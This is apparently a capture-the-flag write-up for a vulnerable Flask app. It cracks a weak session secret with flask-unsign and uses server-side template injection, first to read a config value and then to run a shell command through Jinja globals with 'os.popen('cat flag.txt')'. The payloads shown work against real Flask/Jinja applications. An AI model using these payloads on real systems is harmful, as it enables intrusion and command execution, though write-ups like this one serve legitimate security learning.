part 1: 

we see a very suspicious line

```py
app.secret_key = keyword.kwlist[random.randint(1,len(keyword.kwlist))]  # hm??
```

the wordlist is rather small, so we can use flask-unsign to crack the secret
flag 1: deadbeef{Br0_fr_v1s1t3D_h1s_h0uS3}

part 2:

we see another very suspicious line

```py
app.config["FLAG"] = "deadbeef{br0_k33p5_s3cr3t5_1n_c0nf1g}"
```

we gotta find a way to access ```config["FLAG"]```, but how?

on line 44: <p>{vibe}pilled {vibe}maxxer</p>

this is under ```render_template_string(f""" ``` (line 35), which is vulnerable to SSTI

we can simply send the payload ```{{ config["FLAG"] }} to get the flag

flag 2: deadbeef{br0_k33p5_s3cr3t5_1n_c0nf1g}

part 3:

we notice that flag.txt lives in the same directory as app.py, and if only there was a way to read it, we can get it

turns out, by using the same SSTI exploitation from part 2, we can run commands

send the payload ```{{ cycler.__init__.__globals__.os.popen('cat flag.txt').read() }}``` to get the flag

flag 3: deadbeef{br0_1nj3ct3d_h1s_t3mpl4t3_s3rv3r_s1d3}

note: i hope no one deleted flag.txt
